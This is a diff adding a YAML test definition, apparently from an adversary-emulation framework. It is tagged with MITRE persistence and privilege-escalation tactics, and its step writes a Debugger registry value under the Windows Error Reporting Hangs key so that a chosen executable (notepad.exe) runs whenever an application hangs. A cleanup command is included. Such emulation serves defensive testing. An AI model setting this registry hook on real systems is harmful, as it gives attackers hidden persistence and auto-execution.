@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: Adding custom debugger for Windows Error Reporting
+description: |
+    When applications hang, the Windows Error Reporting framework allows us to attach a debugger, if it is set up in the Registry.
+    Adding executable of choice will let the executable to auto-execute when during any application crash due to functioning of WER framework
+uuid: 17d1a3cc-3373-495a-857a-e5dd005fb302
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: adding-custom-debugger-for-windows-error-reporting
+      inline: |
+        reg add "HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs" /v Debugger /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs" /v Debugger /f
+        executor: command_prompt
